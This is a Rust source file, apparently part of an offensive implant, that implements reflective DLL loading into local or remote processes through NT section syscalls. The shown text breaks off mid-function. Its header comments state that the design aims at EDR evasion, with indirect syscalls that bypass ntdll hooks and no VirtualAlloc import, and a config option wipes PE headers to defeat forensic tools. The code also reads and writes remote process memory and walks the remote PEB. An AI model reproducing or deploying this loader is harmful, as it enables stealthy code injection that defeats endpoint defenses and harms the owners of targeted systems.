//! Reflective DLL loading via NtCreateSection + NtMapViewOfSection.
//!
//! Loads PE DLLs into the current or a remote process **without** calling
//! `VirtualAlloc`, `VirtualAllocEx`, or `VirtualAllocExNuma` at all.  Instead,
//! the lower-level NT section primitives (`NtCreateSection` and
//! `NtMapViewOfSection`) are used to obtain executable memory.  These NT
//! primitives bypass the Win32 API layer entirely and are harder for EDR to
//! monitor because:
//!
//! 1. **No VirtualAlloc IAT entry** — the agent never imports VirtualAlloc,
//!    so EDR cannot hook or log the allocation.
//! 2. **Section objects are legitimate** — EDR sees a section mapping, not a
//!    raw memory allocation, which is a common pattern for shared memory and
//!    mapped files.
//! 3. **Clean syscall path** — uses indirect syscalls via `do_syscall()`,
//!    bypassing any ntdll hooks.
//!
//! # Architecture
//!
//! ## Phase 1 — Section Mapping (replaces VirtualAlloc)
//! - Parse PE headers from the DLL bytes
//! - Calculate total memory from `SizeOfImage` (page-aligned)
//! - Create a section object via `NtCreateSection` with `SEC_COMMIT`
//! - Map it into the process via `NtMapViewOfSection`
//!
//! ## Phase 2 — PE Image Loading
//! - Copy PE headers and sections to their correct virtual addresses
//! - Process relocations (IMAGE_REL_BASED_DIR64, HIGHLOW, ABSOLUTE, etc.)
//! - Rebuild the IAT using clean-mapped dependency DLLs
//! - Apply per-section memory protections via NtProtectVirtualMemory
//!
//! ## Phase 3 — Execution
//! - Optionally call DllMain with DLL_PROCESS_ATTACH
//! - Optionally wipe PE headers after loading
//!
//! # EDR Evasion Comparison
//!
//! | Aspect                | VirtualAlloc Approach              | NtCreateSection Approach            |
//! |-----------------------|------------------------------------|--------------------------------------|
//! | API Layer             | Win32 (kernel32.dll)               | NT (ntdll.dll, direct syscall)       |
//! | IAT Footprint         | VirtualAlloc import visible         | No VirtualAlloc import at all         |
//! | Hook Surface          | EDR hooks VirtualAlloc universally  | Section APIs less commonly hooked     |
//! | Allocation Pattern    | Raw private memory (suspicious)    | Section-backed mapping (legitimate)  |
//! | Memory Type           | MEM_PRIVATE                        | MEM_MAPPED (or MEM_IMAGE w/ SEC_IMAGE)|
//! | Callback Visibility   | EDR Psapi callbacks fire            | Lower-level, fewer callbacks          |
//!
//! # Constraints
//!
//! - Windows x86_64 only (uses NT syscalls)
//! - Requires `direct-syscalls` feature
//! - Handles both PE32 and PE32+ (64-bit) target images

#![cfg(all(windows, feature = "reflective-loader", target_arch = "x86_64"))]

use std::collections::HashMap;
use std::ffi::c_void;
use std::mem;

use crate::syscalls::{do_syscall, get_syscall_id, map_clean_dll, SyscallTarget};
use crate::win_types::SIZE_T;
use crate::win_types::{CONTEXT, CONTEXT_FULL, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use crate::win_types::{HANDLE, PVOID, UNICODE_STRING};
use anyhow::{anyhow, bail, Result};
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC;
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC;
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
    IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
};
use windows_sys::Win32::System::Kernel::LIST_ENTRY;
use windows_sys::Win32::System::Memory::PAGE_READONLY;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, SECTION_ALL_ACCESS, SEC_COMMIT,
};
use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_ABSOLUTE;
use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_DIR64;
use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGH;
use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGHADJ;
use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_HIGHLOW;
use windows_sys::Win32::System::SystemServices::IMAGE_REL_BASED_LOW;
use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};

// ── Constants ───────────────────────────────────────────────────────────────

/// DllMain reason: process attach.
const DLL_PROCESS_ATTACH: u32 = 1;
/// DllMain reason: process detach.
const DLL_PROCESS_DETACH: u32 = 0;

/// Page size on x86_64 Windows.
const PAGE_SIZE: usize = 4096;

/// NtCurrentProcess pseudo-handle (-1).
const CURRENT_PROCESS: HANDLE = (-1isize) as *mut c_void;

/// Maximum number of relocations to process before bailing (sanity limit).
const MAX_RELOCATIONS: usize = 1_000_000;

/// Maximum section header count we accept (sanity limit to avoid OOM).
const MAX_SECTIONS: usize = 128;

// ── Configuration ───────────────────────────────────────────────────────────

/// Configuration for reflective DLL loading.
///
/// Controls which phases are performed and what trade-offs are made
/// between stealth and functionality.
#[derive(Debug, Clone)]
pub struct ReflectiveLoadConfig {
    /// If `true`, map the section as executable and write the DLL directly.
    /// If `false`, map as RW, copy the DLL, then flip protections to RX.
    /// Default: `true` (simpler, slightly more detectable if someone checks
    /// for RX mappings; `false` is stealthier but slower).
    pub execute_from_section: bool,

    /// Resolve import address table entries using clean-mapped DLLs.
    /// If `false`, imported functions will be left as null pointers
    /// (DLL will crash if it calls any import).
    pub resolve_imports: bool,

    /// Process the `.reloc` section and apply delta-based fixups.
    /// Required if the DLL is loaded at an address different from its
    /// preferred image base.  Should almost always be `true`.
    pub handle_relocations: bool,

    /// Call the DLL's entry point (DllMain) with `DLL_PROCESS_ATTACH`
    /// after loading.  Set to `false` for libraries that don't need
    /// initialisation or when the caller wants to invoke exports directly.
    pub call_entry_point: bool,

    /// Wipe the first page of PE headers after loading to prevent
    /// forensic tools from identifying the loaded module.  The header
    /// page is set to `PAGE_READONLY` before zeroing to avoid triggering
    /// copy-on-write semantics.
    pub cleanup_headers: bool,
}

impl Default for ReflectiveLoadConfig {
    fn default() -> Self {
        Self {
            execute_from_section: true,
            resolve_imports: true,
            handle_relocations: true,
            call_entry_point: true,
            cleanup_headers: true,
        }
    }
}

// ── Loaded Module ───────────────────────────────────────────────────────────

/// A reflectively loaded module.
///
/// Provides access to the loaded module's base address, size, entry point,
/// and a cleanup function that unmaps and frees the section.
pub struct LoadedModule {
    /// Base address of the loaded image.
    pub base_address: usize,

    /// Total size of the mapped image (page-aligned).
    pub size: usize,

    /// Address of the entry point (DllMain), or 0 if not available.
    pub entry_point: usize,

    /// Module handle that can be used with `pe_resolve` functions.
    pub module_handle: usize,

    /// Cleanup closure: unmaps the section and frees all resources.
    /// Consumed on drop or when explicitly called.
    cleanup_fn: Option<Box<dyn FnOnce()>>,
}

impl LoadedModule {
    /// Returns the base address as a pointer.
    pub fn base_ptr(&self) -> *mut c_void {
        self.base_address as *mut c_void
    }

    /// Manually invoke the cleanup function (unmap section, free resources).
    /// This is also called on drop.
    pub fn cleanup(&mut self) {
        if let Some(cleanup) = self.cleanup_fn.take() {
            cleanup();
        }
    }

    /// Resolve an exported function by name hash.
    ///
    /// Uses the PE export directory to find the function's RVA and adds the
    /// module base.  Handles forwarded exports.
    pub fn get_export(&self, func_name_hash: u32) -> Option<usize> {
        unsafe { pe_resolve::get_proc_address_by_hash(self.base_address, func_name_hash) }
    }

    /// Resolve an exported function by name (convenience wrapper).
    pub fn get_export_by_name(&self, func_name: &str) -> Option<usize> {
        let mut name_bytes = func_name.as_bytes().to_vec();
        name_bytes.push(0);
        let hash = pe_resolve::hash_str(&name_bytes);
        self.get_export(hash)
    }
}

impl Drop for LoadedModule {
    fn drop(&mut self) {
        self.cleanup();
    }
}

// ── Internal helpers ────────────────────────────────────────────────────────

/// Align `value` up to the next multiple of `align`.
fn align_up(value: usize, align: usize) -> usize {
    (value + align - 1) & !(align - 1)
}

/// PE header information extracted from DLL bytes.
#[derive(Debug)]
struct PeInfo {
    /// Offset of NT headers from base.
    nt_header_offset: usize,
    /// Optional header magic (PE32 = 0x10b, PE32+ = 0x20b).
    magic: u16,
    /// Size of image (from optional header, page-aligned).
    size_of_image: usize,
    /// Preferred image base address.
    image_base: usize,
    /// AddressOfEntryPoint (RVA).
    entry_point_rva: u32,
    /// Number of section headers.
    number_of_sections: u16,
    /// Size of optional header (for finding section table).
    size_of_optional_header: u16,
    /// Export directory RVA and size.
    export_dir: Option<(u32, u32)>,
    /// Import directory RVA and size.
    import_dir: Option<(u32, u32)>,
    /// Base relocation directory RVA and size.
    reloc_dir: Option<(u32, u32)>,
}

#[repr(C)]
struct ProcessBasicInformation {
    reserved1: *mut c_void,
    peb_base_address: *mut RemotePeb,
    reserved2: [*mut c_void; 2],
    unique_process_id: usize,
    reserved3: *mut c_void,
}

#[repr(C)]
struct RemotePeb {
    inherited_address_space: u8,
    read_image_file_exec_options: u8,
    being_debugged: u8,
    bit_fields: u8,
    mutant: *mut c_void,
    image_base_address: *mut c_void,
    ldr: *mut RemotePebLdrData,
}

#[repr(C)]
struct RemotePebLdrData {
    length: u32,
    initialized: u8,
    ss_handle: *mut c_void,
    in_load_order_module_list: LIST_ENTRY,
    in_memory_order_module_list: LIST_ENTRY,
    in_initialization_order_module_list: LIST_ENTRY,
}

#[repr(C)]
struct RemoteLdrDataTableEntry {
    in_load_order_links: LIST_ENTRY,
    in_memory_order_links: LIST_ENTRY,
    in_initialization_order_links: LIST_ENTRY,
    dll_base: *mut c_void,
    entry_point: *mut c_void,
    size_of_image: u32,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
}

const MAX_REMOTE_FORWARDER_DEPTH: u32 = 8;

/// Parse PE headers from raw bytes and extract key fields.
fn parse_pe_headers(dll_bytes: &[u8]) -> Result<PeInfo> {
    if dll_bytes.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
        bail!("DLL bytes too small for DOS header");
    }

    let dos_header = dll_bytes.as_ptr() as *const IMAGE_DOS_HEADER;
    unsafe {
        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            bail!("Invalid DOS signature: {:#x}", (*dos_header).e_magic);
        }

        let e_lfanew = (*dos_header).e_lfanew as usize;
        if e_lfanew + 4 >= dll_bytes.len() {
            bail!("e_lfanew points beyond DLL bytes");
        }

        // Verify PE signature
        let sig = u32::from_le_bytes(
            dll_bytes[e_lfanew..e_lfanew + 4]
                .try_into()
                .map_err(|_| anyhow!("failed to read PE signature"))?,
        );
        if sig != IMAGE_NT_SIGNATURE {
            bail!("Invalid PE signature: {:#x}", sig);
        }

        // Read file header fields
        let fh_offset = e_lfanew + 4;
        if fh_offset + 20 > dll_bytes.len() {
            bail!("File header extends beyond DLL bytes");
        }
        let number_of_sections =
            u16::from_le_bytes(dll_bytes[fh_offset + 2..fh_offset + 4].try_into().unwrap());
        let size_of_optional_header = u16::from_le_bytes(
            dll_bytes[fh_offset + 16..fh_offset + 18]
                .try_into()
                .unwrap(),
        );

        // Read optional header magic
        let opt_offset = fh_offset + 20;
        if opt_offset + 2 > dll_bytes.len() {
            bail!("Optional header extends beyond DLL bytes");
        }
        let magic = u16::from_le_bytes(dll_bytes[opt_offset..opt_offset + 2].try_into().unwrap());

        let (size_of_image, image_base, entry_point_rva) = match magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                if opt_offset + mem::size_of::<IMAGE_NT_HEADERS32>() - 4 > dll_bytes.len() {
                    bail!("PE32 optional header extends beyond DLL bytes");
                }
                let nt32 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
                (
                    (*nt32).OptionalHeader.SizeOfImage as usize,
                    (*nt32).OptionalHeader.ImageBase as usize,
                    (*nt32).OptionalHeader.AddressOfEntryPoint,
                )
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                if opt_offset + mem::size_of::<IMAGE_NT_HEADERS64>() - 4 > dll_bytes.len() {
                    bail!("PE32+ optional header extends beyond DLL bytes");
                }
                let nt64 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
                (
                    (*nt64).OptionalHeader.SizeOfImage as usize,
                    (*nt64).OptionalHeader.ImageBase as usize,
                    (*nt64).OptionalHeader.AddressOfEntryPoint,
                )
            }
            _ => bail!("Unsupported PE optional header magic: {:#x}", magic),
        };

        if number_of_sections > MAX_SECTIONS as u16 {
            bail!("Too many sections: {}", number_of_sections);
        }
        if size_of_image == 0 {
            bail!("SizeOfImage is zero");
        }

        // Extract data directories
        let (export_dir, import_dir, reloc_dir) = match magic {
            IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
                let nt32 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
                let dd = &(*nt32).OptionalHeader.DataDirectory;
                (
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_EXPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_IMPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_BASERELOC as usize),
                )
            }
            IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
                let nt64 = (dll_bytes.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
                let dd = &(*nt64).OptionalHeader.DataDirectory;
                (
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_EXPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_IMPORT as usize),
                    dir_entry(dd, IMAGE_DIRECTORY_ENTRY_BASERELOC as usize),
                )
            }
            _ => (None, None, None),
        };

        Ok(PeInfo {
            nt_header_offset: e_lfanew,
            magic,
            size_of_image: align_up(size_of_image, PAGE_SIZE),
            image_base,
            entry_point_rva,
            number_of_sections,
            size_of_optional_header,
            export_dir,
            import_dir,
            reloc_dir,
        })
    }
}

/// Extract an optional data directory entry (RVA, Size).
fn dir_entry(
    dd: &[windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DATA_DIRECTORY],
    index: usize,
) -> Option<(u32, u32)> {
    dd.get(index)
        .filter(|e| e.VirtualAddress != 0)
        .map(|e| (e.VirtualAddress, e.Size))
}

/// Get a pointer to the section header array from DLL bytes.
fn get_section_headers<'a>(dll_bytes: &'a [u8], pe: &PeInfo) -> Result<&'a [IMAGE_SECTION_HEADER]> {
    let section_offset = pe.nt_header_offset
        + 4 // PE signature
        + mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
        + pe.size_of_optional_header as usize;

    let section_table_size =
        pe.number_of_sections as usize * mem::size_of::<IMAGE_SECTION_HEADER>();
    if section_offset + section_table_size > dll_bytes.len() {
        bail!("Section table extends beyond DLL bytes");
    }

    let ptr = dll_bytes[section_offset..].as_ptr() as *const IMAGE_SECTION_HEADER;
    Ok(unsafe { std::slice::from_raw_parts(ptr, pe.number_of_sections as usize) })
}

/// Resolve a syscall target, wrapping the error.
fn resolve_syscall(name: &str) -> Result<SyscallTarget> {
    get_syscall_id(name).map_err(|e| anyhow!("failed to resolve SSN for {}: {}", name, e))
}

/// Close an NT handle safely via NtClose.
fn close_nt_handle(handle: HANDLE) {
    if !handle.is_null() {
        unsafe { pe_resolve::close_handle(handle) };
    }
}

// ── NT Syscall Wrappers ─────────────────────────────────────────────────────

/// Create a section object backed by the page file (SEC_COMMIT).
///
/// Returns the section handle on success.  The caller must close it.
unsafe fn nt_create_section(maximum_size: usize, page_protection: u32) -> Result<HANDLE> {
    let sys = resolve_syscall("NtCreateSection")?;
    let mut h_section: HANDLE = std::ptr::null_mut();

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            &mut h_section as *mut _ as u64,             // SectionHandle
            SECTION_ALL_ACCESS as u64,                   // DesiredAccess
            std::ptr::null_mut::<u64>() as u64,          // ObjectAttributes (NULL)
            &(maximum_size as i64) as *const i64 as u64, // MaximumSize
            page_protection as u64,                      // SectionPageProtection
            SEC_COMMIT as u64,                           // AllocationAttributes
            std::ptr::null_mut::<u64>() as u64,          // FileHandle (NULL = page file)
        ],
    );

    if status != 0 {
        bail!("NtCreateSection failed with status {:#x}", status as u32);
    }
    if h_section.is_null() {
        bail!("NtCreateSection returned null handle");
    }
    Ok(h_section)
}

/// Map a view of a section into the specified process.
///
/// Returns (base_address, view_size) on success.
unsafe fn nt_map_view_of_section(
    h_section: HANDLE,
    process_handle: HANDLE,
    view_size: usize,
    page_protection: u32,
) -> Result<(*mut c_void, SIZE_T)> {
    let sys = resolve_syscall("NtMapViewOfSection")?;
    let mut base_addr: PVOID = std::ptr::null_mut();
    let mut actual_view_size: SIZE_T = view_size;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            h_section as u64,                       // SectionHandle
            process_handle as u64,                  // ProcessHandle
            &mut base_addr as *mut _ as u64,        // BaseAddress
            0,                                      // ZeroBits
            0,                                      // CommitSize
            std::ptr::null_mut::<u64>() as u64,     // SectionOffset
            &mut actual_view_size as *mut _ as u64, // ViewSize
            1,                                      // InheritDisposition (ViewShare)
            0,                                      // AllocationType
            page_protection as u64,                 // Win32Protect
        ],
    );

    if status != 0 {
        bail!("NtMapViewOfSection failed with status {:#x}", status as u32);
    }
    if base_addr.is_null() {
        bail!("NtMapViewOfSection returned null base address");
    }
    Ok((base_addr, actual_view_size))
}

/// Unmap a view of a section from the current process.
unsafe fn nt_unmap_view_of_section(base: *mut c_void) -> Result<()> {
    let sys = resolve_syscall("NtUnmapViewOfSection")?;
    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            CURRENT_PROCESS as u64, // ProcessHandle
            base as u64,            // BaseAddress
        ],
    );
    if status != 0 {
        bail!(
            "NtUnmapViewOfSection failed with status {:#x}",
            status as u32
        );
    }
    Ok(())
}

/// Change memory protection via NtProtectVirtualMemory.
unsafe fn nt_protect_virtual_memory(
    process_handle: HANDLE,
    base: *mut c_void,
    size: usize,
    new_protect: u32,
) -> Result<u32> {
    let sys = resolve_syscall("NtProtectVirtualMemory")?;
    let mut base_ptr = base;
    let mut region_size: SIZE_T = size;
    let mut old_protect: u32 = 0;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            process_handle as u64,             // ProcessHandle
            &mut base_ptr as *mut _ as u64,    // BaseAddress
            &mut region_size as *mut _ as u64, // RegionSize
            new_protect as u64,                // NewProtect
            &mut old_protect as *mut _ as u64, // OldProtect
        ],
    );

    if status != 0 {
        bail!(
            "NtProtectVirtualMemory failed with status {:#x}",
            status as u32
        );
    }
    Ok(old_protect)
}

/// Write data to a remote process via NtWriteVirtualMemory.
unsafe fn nt_write_virtual_memory(
    process_handle: HANDLE,
    base: *mut c_void,
    data: &[u8],
) -> Result<()> {
    let sys = resolve_syscall("NtWriteVirtualMemory")?;
    let mut bytes_written: usize = 0;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            process_handle as u64,               // ProcessHandle
            base as u64,                         // BaseAddress
            data.as_ptr() as u64,                // Buffer
            data.len() as u64,                   // NumberOfBytesToWrite
            &mut bytes_written as *mut _ as u64, // NumberOfBytesWritten
        ],
    );

    if status != 0 {
        bail!(
            "NtWriteVirtualMemory failed with status {:#x}",
            status as u32
        );
    }
    if bytes_written != data.len() {
        bail!(
            "NtWriteVirtualMemory wrote {} of {} bytes",
            bytes_written,
            data.len()
        );
    }
    Ok(())
}

/// Read exactly `buffer.len()` bytes from a remote process.
unsafe fn nt_read_virtual_memory(
    process_handle: HANDLE,
    base: *const c_void,
    buffer: &mut [u8],
) -> Result<()> {
    let sys = resolve_syscall("NtReadVirtualMemory")?;
    let mut bytes_read: usize = 0;

    let status = do_syscall(
        sys.ssn,
        sys.gadget_addr,
        &[
            process_handle as u64,            // ProcessHandle
            base as u64,                      // BaseAddress
            buffer.as_mut_ptr() as u64,       // Buffer
            buffer.len() as u64,              // NumberOfBytesToRead
            &mut bytes_read as *mut _ as u64, // NumberOfBytesRead
        ],
    );

    if status != 0 {
        bail!(
            "NtReadVirtualMemory failed with status {:#x}",
            status as u32
        );
    }
    if bytes_read != buffer.len() {
        bail!(
            "NtReadVirtualMemory read {} of {} bytes",
            bytes_read,
            buffer.len()
        );
    }
    Ok(())
}

unsafe fn nt_read_remote_struct<T>(
    process_handle: HANDLE,
    remote_addr: *const c_void,
) -> Result<T> {
    let mut value = std::mem::MaybeUninit::<T>::uninit();
    let size = std::mem::size_of::<T>();
    let buf = std::slice::from_raw_parts_mut(value.as_mut_ptr() as *mut u8, size);
    nt_read_virtual_memory(process_handle, remote_addr, buf)?;
    Ok(value.assume_init())
}

unsafe fn nt_read_remote_exact(
    process_handle: HANDLE,
    remote_addr: usize,
    len: usize,
    context: &str,
) -> Result<Vec<u8>> {
    let mut buf = vec![0u8; len];
    nt_read_virtual_memory(process_handle, remote_addr as *const c_void, &mut buf)
        .map_err(|e| anyhow!("{context}: {e}"))?;
    Ok(buf)
}

unsafe fn read_remote_c_string_from_image(
    process_handle: HANDLE,
    image_base: usize,
    rva: usize,
    image_size: usize,
    max_len: usize,
    context: &str,
) -> Result<String> {
    if rva >= image_size {
        bail!(
            "{context}: string RVA {:#x} is outside image size {:#x}",
            rva,
            image_size
        );
    }
    let len = std::cmp::min(max_len, image_size - rva);
    let bytes = nt_read_remote_exact(process_handle, image_base + rva, len, context)?;
    let nul = bytes.iter().position(|&b| b == 0).ok_or_else(|| {
        anyhow!(
            "{context}: string at RVA {:#x} is not NUL-terminated within {:#x} bytes",
            rva,
            len
        )
    })?;
    let value = std::str::from_utf8(&bytes[..nul])
        .map_err(|e| anyhow!("{context}: string at RVA {:#x} is not UTF-8: {}", rva, e))?;
    if value.is_empty() {
        bail!("{context}: string at RVA {:#x} is empty", rva);
    }
    Ok(value.to_string())
}

unsafe fn normalize_import_dll_name(name: &str) -> String {
    let lower = name.to_ascii_lowercase();
    if lower.ends_with(".dll") {
        lower
    } else {
        format!("{}.dll", lower)
    }
}

unsafe fn get_remote_ntdll_base(process_handle: HANDLE) -> Option<usize> {
    type NtQueryInformationProcessFn =
        unsafe extern "system" fn(HANDLE, u32, *mut c_void, u32, *mut u32) -> i32;

    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )?;
    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());

    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut return_len = 0u32;
    let status = ntqip(
        process_handle,
        0,
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut return_len,
    );
    if status < 0 || pbi.peb_base_address.is_null() {
        return None;
    }

    let peb: RemotePeb =
        nt_read_remote_struct(process_handle, pbi.peb_base_address as *const c_void).ok()?;
    if peb.ldr.is_null() {
        return None;
    }

    let ldr: RemotePebLdrData =
        nt_read_remote_struct(process_handle, peb.ldr as *const c_void).ok()?;
    let list_head = (peb.ldr as usize + 0x10) as *mut LIST_ENTRY;
    let mut current = ldr.in_load_order_module_list.Flink;
    let mut guard = 0usize;

    while !current.is_null() && current != list_head && guard < 1024 {
        guard += 1;

        let entry: RemoteLdrDataTableEntry =
            match nt_read_remote_struct(process_handle, current as *const c_void) {
                Ok(e) => e,
                Err(_) => break,
            };

        let dll_base = entry.dll_base as usize;
        let base_name = entry.base_dll_name;
        if dll_base != 0
            && !base_name.Buffer.is_null()
            && base_name.Length >= 2
            && (base_name.Length as usize) <= 520
        {
            let mut wide = vec![0u8; base_name.Length as usize];
            if nt_read_virtual_memory(process_handle, base_name.Buffer as *const c_void, &mut wide)
                .is_ok()
            {
                let mut wide_u16 = vec![0u16; wide.len() / 2];
                for (idx, chunk) in wide.chunks_exact(2).enumerate() {
                    wide_u16[idx] = u16::from_le_bytes([chunk[0], chunk[1]]);
                }
                let name = String::from_utf16_lossy(&wide_u16).to_ascii_lowercase();
                if name == "ntdll.dll" || name == "ntdll" {
                    return Some(dll_base);
                }
            }
        }

        current = entry.in_load_order_links.Flink;
    }

    None
}

unsafe fn build_remote_module_map(process_handle: HANDLE) -> Result<HashMap<String, usize>> {
    type NtQueryInformationProcessFn =
        unsafe extern "system" fn(HANDLE, u32, *mut c_void, u32, *mut u32) -> i32;

    let local_ntdll =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
            .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )
    .ok_or_else(|| anyhow!("build_remote_module_map: NtQueryInformationProcess not found"))?;
    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());

    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut return_len = 0u32;
    let status = ntqip(
        process_handle,
        0,
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut return_len,
    );
    if status < 0 || pbi.peb_base_address.is_null() {
        bail!(
            "build_remote_module_map: NtQueryInformationProcess failed (status={:#x})",
            status
        );
    }

    let peb: RemotePeb =
        nt_read_remote_struct(process_handle, pbi.peb_base_address as *const c_void)
            .map_err(|_| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
    if peb.ldr.is_null() {
        bail!("build_remote_module_map: remote PEB.Ldr is null");
    }

    let ldr: RemotePebLdrData = nt_read_remote_struct(process_handle, peb.ldr as *const c_void)
        .map_err(|_| anyhow!("build_remote_module_map: failed to read remote PEB_LDR_DATA"))?;
    let list_head = (peb.ldr as usize + 0x10) as *mut LIST_ENTRY;
    let mut current = ldr.in_load_order_module_list.Flink;
    let mut guard = 0usize;
    let mut map = HashMap::new();

    while !current.is_null() && current != list_head && guard < 4096 {
        guard += 1;

        let entry: RemoteLdrDataTableEntry =
            match nt_read_remote_struct(process_handle, current as *const c_void) {
                Ok(e) => e,
                Err(_) => break,
            };

        let dll_base = entry.dll_base as usize;
        let base_name = entry.base_dll_name;
        if dll_base != 0
            && !base_name.Buffer.is_null()
            && base_name.Length >= 2
            && (base_name.Length as usize) <= 520
        {
            let mut wide = vec![0u8; base_name.Length as usize];
            if nt_read_virtual_memory(process_handle, base_name.Buffer as *const c_void, &mut wide)
                .is_ok()
            {
                let mut wide_u16 = vec![0u16; wide.len() / 2];
                for (idx, chunk) in wide.chunks_exact(2).enumerate() {
                    wide_u16[idx] = u16::from_le_bytes([chunk[0], chunk[1]]);
                }
                let name = String::from_utf16_lossy(&wide_u16).to_ascii_lowercase();
                map.insert(name, dll_base);
            }
        }

        current = entry.in_load_order_links.Flink;
    }

    Ok(map)
}

unsafe fn resolve_remote_export(
    process_handle: HANDLE,
    remote_dll_base: usize,
    fn_name: &str,
) -> Result<usize> {
    let read_bytes = |addr: usize, len: usize| -> Result<Vec<u8>> {
        nt_read_remote_exact(
            process_handle,
            addr,
            len,
            "resolve_remote_export: NtReadVirtualMemory",
        )
    };

    let dos = read_bytes(remote_dll_base, 64)?;
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        bail!(
            "resolve_remote_export: bad DOS magic at {:#x}: {:#x}",
            remote_dll_base,
            e_magic
        );
    }
    let e_lfanew = u32::from_le_bytes(dos[0x3C..0x40].try_into().unwrap()) as usize;

    let nt = read_bytes(remote_dll_base + e_lfanew, 144)?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        bail!(
            "resolve_remote_export: bad PE signature at {:#x}",
            remote_dll_base
        );
    }
    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    if opt_magic != 0x020B {
        bail!(
            "resolve_remote_export: unsupported optional-header magic {:#x} at {:#x}",
            opt_magic,
            remote_dll_base
        );
    }

    let export_rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
    let export_size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
    if export_rva == 0 || export_size < 40 {
        bail!(
            "resolve_remote_export: DLL at {:#x} has no export directory",
            remote_dll_base
        );
    }

    let exp = read_bytes(remote_dll_base + export_rva, export_size)?;
    let num_names = u32::from_le_bytes(exp[24..28].try_into().unwrap()) as usize;
    let fn_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;
    let name_table_rva = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as usize;
    let ordinal_table_rva = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as usize;

    if num_names == 0 {
        bail!(
            "resolve_remote_export: DLL at {:#x} has no named exports",
            remote_dll_base
        );
    }

    let name_ptrs = read_bytes(remote_dll_base + name_table_rva, num_names * 4)?;
    let ordinals = read_bytes(remote_dll_base + ordinal_table_rva, num_names * 2)?;

    for i in 0..num_names {
        let name_rva = u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
        let name_raw =
            read_bytes(remote_dll_base + name_rva, 256).unwrap_or_else(|_| vec![0u8; 256]);
        let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
        let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
        if name == fn_name {
            let ordinal =
                u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
            let fn_rva_bytes = read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
            let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
            if fn_rva >= export_rva && fn_rva < export_rva + export_size {
                let forwarder = read_remote_c_string_from_image(
